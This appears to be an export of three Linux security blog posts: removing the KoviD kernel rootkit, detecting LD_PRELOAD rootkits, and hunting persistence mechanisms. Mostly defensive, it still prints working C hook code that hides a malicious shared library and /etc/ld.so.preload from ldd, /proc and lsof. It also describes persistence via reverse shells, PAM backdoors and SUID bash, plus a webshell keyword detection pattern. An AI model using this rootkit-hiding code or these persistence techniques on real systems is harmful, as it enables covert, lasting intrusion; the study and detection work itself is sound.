[{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.","title":"A simple way to detect and remove LKM rootkit KoviD"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace üòÇ.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities.","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Hello everyone, welcome to this post, where I will cover the topic ‚ÄúLinux Threat Hunting Persistence‚Äù.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nB√¥nus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"Hello everyone, welcome to this post, where I will cover the topic ‚ÄúLinux Threat Hunting Persistence‚Äù.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.","title":"Linux Threat Hunting Persistence"}]